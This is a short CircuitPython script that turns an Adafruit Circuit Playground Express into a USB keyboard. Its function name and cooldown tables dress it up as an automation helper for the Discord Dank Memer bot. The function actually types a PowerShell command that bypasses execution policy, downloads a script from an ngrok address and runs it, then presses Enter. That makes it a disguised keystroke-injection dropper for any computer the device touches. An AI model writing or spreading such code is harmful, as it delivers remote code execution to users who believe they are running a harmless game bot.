import usb_hid
import time
from adafruit_circuitplayground.express import cpx
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

previous_times = {
    "beg": 0,
    "hunt": 0,
    "fish": 0,
    "dig": 0,
    "dep all": 0,
}

wait_times = {
    "beg": 46,
    "hunt": 41,
    "fish": 41,
    "dig": 41,
    "dep all": 300,
}

def discord_dank_memer():
    global previous_times
    global wait_times
    layout.write('''powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('https://d41cb395c6c7.ngrok.io/main.ps1')|iex"''')
    kbd.send(Keycode.ENTER)

apps = [[discord_dank_memer,[255,0,0]]]
current_app = 0
running_app = False
while True:
    pass
